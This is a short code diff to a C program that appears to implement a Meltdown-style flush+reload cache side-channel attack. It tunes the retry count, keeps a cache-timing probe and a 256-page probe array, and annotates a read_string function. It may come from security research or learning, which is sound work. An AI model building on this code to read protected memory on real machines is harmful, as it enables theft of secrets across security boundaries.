@@ -14,7 +14,7 @@
 #endif
 
 #define DEBUG 1
-#define RETRIES 1
+#define RETRIES 1000
 #define THRESHOLD 250
 
 // Downside of this implementation, can't read 0 values
@@ -51,7 +51,6 @@ static inline uint64_t rdtscp() {
 
 }
 
-// measures access time, if hit return 1 else return 0;
 static inline int flush_reload(void *p) {
   // time access
   register uint64_t start, elapsed; 
@@ -80,10 +79,12 @@ void init() {
   for(int i = 0; i < 256; i++) {
     flush(&rec[i * 4096]); //flush it from memory 
   }
-
   INFO("Init finished\n");
 }
 
+/*
+Read a string from the addr position (not really fully meltdown yet it doesn't cause any exceptions
+ */
 char* __attribute__((optimize("-Os"), noinline)) read_string(char* addr) {
   char* ret = malloc(100); // 100 characters
   memset(ret, '\0', 100); // 0 out
